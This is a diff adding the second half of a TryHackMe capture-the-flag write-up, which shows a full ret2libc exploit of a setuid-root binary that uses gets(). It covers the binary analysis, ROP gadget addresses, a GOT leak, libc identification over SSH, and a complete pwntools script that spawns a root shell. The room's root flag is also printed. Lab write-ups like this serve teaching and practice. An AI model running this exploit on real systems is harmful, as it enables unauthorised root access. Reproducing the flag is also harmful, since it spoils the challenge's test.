@@ -370,12 +370,633 @@ playing around :
 
 ![Image]({{ site.baseurl }}/images/obscure/38.png)
 
-lets donwload it in our machine and analyse it using ghydra : 
+lets donwload it in our machine :
 
-**TO BE CONT**
+![Image]({{ site.baseurl }}/images/obscure/39.png)
+
+
+## 1. Binary Analysis
+
+I first checked the binary's security protections:
+
+```bash
+checksec --file=exploit_me
+```
+
+Output:
+
+```text
+Partial RELRO
+No canary found
+NX enabled
+No PIE
+```
+
+The absence of a stack canary means that stack corruption will not be detected through the usual canary mechanism.
+
+The absence of PIE means that addresses inside the executable remain fixed.
+
+NX is enabled, so executing shellcode directly from the stack is not the intended approach. Instead, I decided to use ROP.
+
+### Finding the vulnerability
+
+I opened the binary in Ghidra and inspected its `main()` function.
+
+![Image]({{ site.baseurl }}/images/obscure/40.png) 
+
+The decompiled code was:
+
+```c
+undefined8 main(void)
+{
+    char local_28[32];
+
+    setuid(0);
+
+    puts("Exploit this binary for root!");
+
+    gets(local_28);
+
+    return 0;
+}
+```
+
+Two instructions immediately caught my attention:
+
+![Image]({{ site.baseurl }}/images/obscure/41.png)
+
+```c
+setuid(0);
+gets(local_28);
+```
+
+The first instruction changes the process's user IDs to root, provided the call succeeds.
+
+The second instruction is vulnerable because `gets()` does not perform bounds checking.
+
+The destination buffer is only 32 bytes, but we can supply a much larger input and overwrite data stored beyond it, including the saved return address.
+
+This gives us control over the program's execution flow.
+
+## 2. Calculating the Return Address Offset
+
+I inspected the disassembly:
+
+```bash
+objdump -d -M intel exploit_me | sed -n '/<main>:/,/^$/p'
+```
+
+Relevant instructions:
+
+```asm
+push rbp
+mov rbp,rsp
+sub rsp,0x20
+```
+
+The instruction `sub rsp,0x20` allocates 32 bytes for the local buffer.
+
+The saved RBP occupies another 8 bytes.
+
+Therefore:
+
+```text
+32 bytes  = Local buffer
+ 8 bytes  = Saved RBP
+------------------------
+40 bytes  = Saved RIP offset
+```
+
+Our offset is:
+
+```python
+offset = 40
+```
+
+The next eight bytes after this padding overwrite the saved return address.
+
+## 3. Finding the ROP Gadgets
+
+Since NX is enabled, I used Return-Oriented Programming.
+
+I searched for the required gadgets:
+
+```bash
+ROPgadget --binary exploit_me | grep -E 'pop rdi|: ret$'
+```
+
+The important results were:
+
+```text
+0x0000000000400653 : pop rdi ; ret
+0x0000000000400451 : ret
+```
+
+I also identified the main function and the PLT entries:
+
+```bash
+objdump -d -M intel exploit_me | grep -E '<(main|puts@plt)>'
+```
+
+The addresses used in the exploit were:
+
+```text
+main      = 0x4005b6
+puts@plt  = 0x400470
+pop rdi   = 0x400653
+ret       = 0x400451
+```
+
+Next, I inspected the GOT entries:
+
+```bash
+readelf -r exploit_me
+```
+
+The relevant addresses were:
+
+```text
+puts@got   = 0x601018
+gets@got   = 0x601028
+setuid@got = 0x601030
+```
+
+These addresses are important because the GOT contains pointers to the actual libc functions used by the program.
+
+## 4. Understanding the Exploitation Strategy
+
+The goal is to execute:
+
+```c
+system("/bin/sh");
+```
+
+However, we do not initially know the runtime address of `system()` because ASLR randomizes the location of libc.
+
+To solve this, I used a two-stage ROP exploit.
+
+**Stage 1:** Leak libc function addresses through the GOT and return to `main()`.
+
+**Stage 2:** Calculate the libc base, locate `system()` and `/bin/sh`, then execute a second ROP chain.
+
+The first stage leaks three functions:
+
+```c
+puts(gets@got);
+puts(puts@got);
+puts(setuid@got);
+```
+
+The reason for leaking three addresses is to help identify and verify the exact libc version used by the target.
+
+## 5. Stage One: Leaking libc Addresses
+
+The first-stage ROP chain is:
+
+```python
+payload = flat(
+    b"A" * 40,
+
+    POP_RDI,
+    GETS_GOT,
+    PUTS_PLT,
+
+    POP_RDI,
+    PUTS_GOT,
+    PUTS_PLT,
+
+    POP_RDI,
+    SETUID_GOT,
+    PUTS_PLT,
+
+    MAIN
+)
+```
+
+The chain works as follows:
+
+1. The first 40 bytes reach the saved return address.
+2. `pop rdi; ret` loads the address of `gets@got` into RDI.
+3. `puts@plt` prints the pointer stored in the GOT.
+4. The same process is repeated for `puts` and `setuid`.
+5. Execution returns to `main()`, allowing us to send another payload.
+
+Returning to `main()` is particularly important because it keeps the same process alive. We need the leaked addresses from this process to calculate the second-stage payload.
+
+## 6. Identifying the Target's libc
+
+After running the first-stage exploit remotely, I obtained these leaks:
+
+```text
+gets   = 0x7f6841c47d90
+puts   = 0x7f6841c486a0
+setuid = 0x7f6841ca6330
+```
+
+I needed the corresponding function offsets inside the target's libc.
+
+I checked the target's libc location:
+
+```bash
+ssh -i id_rsa zeeshan@10.128.128.16 \
+'readlink -f /lib/x86_64-linux-gnu/libc.so.6'
+```
+
+The result was:
+
+```text
+/lib/x86_64-linux-gnu/libc-2.23.so
+```
+
+I downloaded that exact library:
+
+```bash
+scp -i id_rsa zeeshan@10.128.128.16:/lib/x86_64-linux-gnu/libc-2.23.so ./libc_target.so
+```
+
+### Extracting libc function offsets
+
+I used `readelf`:
+
+```bash
+readelf -Ws libc_target.so | grep -E ' (gets|puts|setuid|system)(@@|$)'
+```
+
+Output:
+
+```text
+setuid  0x00000000000cd330
+gets    0x000000000006ed90
+puts    0x000000000006f6a0
+system  0x00000000000453a0
+```
+
+Next, I searched for the `/bin/sh` string:
+
+```bash
+strings -a -t x libc_target.so | grep '/bin/sh'
+```
+
+Output:
+
+```text
+18ce57 /bin/sh
+```
+
+This gave me all the offsets needed for the second stage.
+
+### Verifying the libc
+
+Before calculating the base address, I compared the differences between the leaked addresses and their corresponding libc offsets.
+
+From the leaks:
+
+```text
+puts - gets = 0x910
+
+setuid - gets = 0x5e5a0
+```
+
+From the libc file:
+
+```text
+puts offset - gets offset = 0x910
+
+setuid offset - gets offset = 0x5e5a0
+```
+
+The differences matched, confirming that the downloaded libc was consistent with the leaked addresses.
+
+## 7. Calculating the libc Base Address
+
+The general formula is:
+
+```text
+libc_base = leaked_function_address - function_offset
+```
+
+Using the leaked `gets` address:
+
+```text
+gets leak   = 0x7f6841c47d90
+gets offset = 0x6ed90
+```
+
+The calculation is:
+
+```text
+libc_base = 0x7f6841c47d90 - 0x6ed90
+
+libc_base = 0x7f6841bda000
+```
+
+I also verified the calculation using Python:
+
+```bash
+python3 -c 'print(hex(0x7f6841c47d90 - 0x6ed90))'
+```
+
+Output:
+
+```text
+0x7f6841bda000
+```
+
+### Calculating system()
+
+The formula is:
+
+```text
+system_address = libc_base + system_offset
+```
+
+Using the extracted offset:
+
+```text
+system offset = 0x453a0
+```
+
+Calculation:
+
+```bash
+python3 -c 'print(hex(0x7f6841bda000 + 0x453a0))'
+```
+
+Output:
+
+```text
+0x7f6841c1f3a0
+```
+
+### Calculating /bin/sh
+
+The formula is:
+
+```text
+binsh_address = libc_base + binsh_offset
+```
+
+Using:
+
+```text
+/bin/sh offset = 0x18ce57
+```
+
+Calculation:
+
+```bash
+python3 -c 'print(hex(0x7f6841bda000 + 0x18ce57))'
+```
+
+Output:
+
+```text
+0x7f6841d46e57
+```
+
+We now have all the addresses required for the second stage.
+
+## 8. Stage Two: Executing system("/bin/sh")
+
+The final ROP chain is:
+
+```python
+payload2 = flat(
+    b"A" * 40,
+    RET,
+    POP_RDI,
+    binsh_addr,
+    system_addr
+)
+```
+
+The purpose of each element is:
+
+| Element | Purpose |
+|---|---|
+| `A * 40` | Reach the saved return address |
+| `RET` | Align the stack for the function call |
+| `POP_RDI` | Load the first function argument |
+| `binsh_addr` | Address of `/bin/sh` |
+| `system_addr` | Address of `system()` |
+
+The extra `ret` gadget is used to correct stack alignment according to the x86-64 System V ABI.
+
+The chain effectively performs:
+
+```c
+system("/bin/sh");
+```
+
+Because the binary already successfully executed `setuid(0)` before reaching the vulnerable input, the spawned shell inherits root user IDs.
+
+## 9. Complete Remote Exploit
+
+I ran the exploit from Kali using pwntools' SSH functionality.
+
+The target did not need pwntools or Python. Pwntools was only required on my attacking machine.
+
+Save the following as `remote_exploit.py`:
+
+```python
+from pwn import *
+
+context.arch = "amd64"
+context.log_level = "info"
+
+# -------------------------------
+# SSH CONFIGURATION
+# -------------------------------
+
+HOST = "ip"
+USER = "zeeshan"
+KEY = "id_rsa"
+
+# -------------------------------
+# BINARY ADDRESSES
+# -------------------------------
+
+OFFSET = 40
+
+RET = 0x400451
+POP_RDI = 0x400653
+MAIN = 0x4005b6
+
+PUTS_PLT = 0x400470
+
+GETS_GOT = 0x601028
+PUTS_GOT = 0x601018
+SETUID_GOT = 0x601030
+
+PROMPT = b"Exploit this binary for root!\n"
+
+# -------------------------------
+# TARGET LIBC OFFSETS
+# -------------------------------
+
+GETS_OFFSET = 0x6ed90
+PUTS_OFFSET = 0x6f6a0
+SETUID_OFFSET = 0xcd330
+
+SYSTEM_OFFSET = 0x453a0
+BINSH_OFFSET = 0x18ce57
+
+# -------------------------------
+# SSH CONNECTION
+# -------------------------------
+
+log.info("Connecting to target through SSH...")
+
+ssh_conn = ssh(
+    host=HOST,
+    user=USER,
+    keyfile=KEY
+)
+
+log.success("SSH connection established")
+
+# Launch the vulnerable binary remotely
+io = ssh_conn.process("/exploit_me")
+
+io.recvuntil(PROMPT)
+
+# -------------------------------
+# STAGE 1: LIBC LEAK
+# -------------------------------
+
+log.info("Building first-stage ROP chain...")
+
+payload = flat(
+    b"A" * OFFSET,
+
+    POP_RDI,
+    GETS_GOT,
+    PUTS_PLT,
+
+    POP_RDI,
+    PUTS_GOT,
+    PUTS_PLT,
+
+    POP_RDI,
+    SETUID_GOT,
+    PUTS_PLT,
+
+    MAIN
+)
+
+io.sendline(payload)
+
+# Receive the three leaked addresses
+gets_leak = u64(
+    io.recvline().strip().ljust(8, b"\x00")
+)
+
+puts_leak = u64(
+    io.recvline().strip().ljust(8, b"\x00")
+)
+
+setuid_leak = u64(
+    io.recvline().strip().ljust(8, b"\x00")
+)
+
+log.success("gets leak: {}".format(hex(gets_leak)))
+log.success("puts leak: {}".format(hex(puts_leak)))
+log.success("setuid leak: {}".format(hex(setuid_leak)))
+
+# -------------------------------
+# VERIFY LIBC
+# -------------------------------
+
+if puts_leak - gets_leak != PUTS_OFFSET - GETS_OFFSET:
+    log.failure("puts offset mismatch")
+    exit()
+
+if setuid_leak - gets_leak != SETUID_OFFSET - GETS_OFFSET:
+    log.failure("setuid offset mismatch")
+    exit()
+
+log.success("Target libc verified")
+
+# -------------------------------
+# CALCULATE LIBC ADDRESSES
+# -------------------------------
+
+libc_base = gets_leak - GETS_OFFSET
+
+system_addr = libc_base + SYSTEM_OFFSET
+binsh_addr = libc_base + BINSH_OFFSET
+
+log.success("libc base: {}".format(hex(libc_base)))
+log.success("system: {}".format(hex(system_addr)))
+log.success("/bin/sh: {}".format(hex(binsh_addr)))
+
+# -------------------------------
+# STAGE 2: ROOT SHELL
+# -------------------------------
+
+io.recvuntil(PROMPT)
+
+log.info("Building second-stage ROP chain...")
+
+payload2 = flat(
+    b"A" * OFFSET,
+    RET,
+    POP_RDI,
+    binsh_addr,
+    system_addr
+)
+
+io.sendline(payload2)
+
+log.success("Second-stage payload sent")
+
+# -------------------------------
+# INTERACTIVE SHELL
+# -------------------------------
+
+io.interactive()
+```
+
+### Running the exploit
+
+On your machine :
+
+```bash
+chmod 600 id_rsa
+python3 remote_exploit.py
+```
+
+After obtaining the shell, I verified the privileges:
+
+```bash
+id
+whoami
+```
+![Image]({{ site.baseurl }}/images/obscure/42.png)
+
+
+The result confirmed root access:
+
+```text
+uid=0(root) gid=0(root)
+```
+
+Finally, I retrieved the root flag:
+
+```bash
+cat /root/root.txt
+```
+![Image]({{ site.baseurl }}/images/obscure/43.png)
+
+# ROOT FLAG : 
+
+````bash
+THM{8bbc6221d009576d37e28acdd9da7aba}
+````
+
+**that's it guys i hope you found this useful .**
 
 **Special thanks to [Tryhackme](https://tryhackme.com)**
-
-**that's it . see you next time**	
+	
 
 ![Image]({{ site.baseurl }}/images/cat.jpeg)
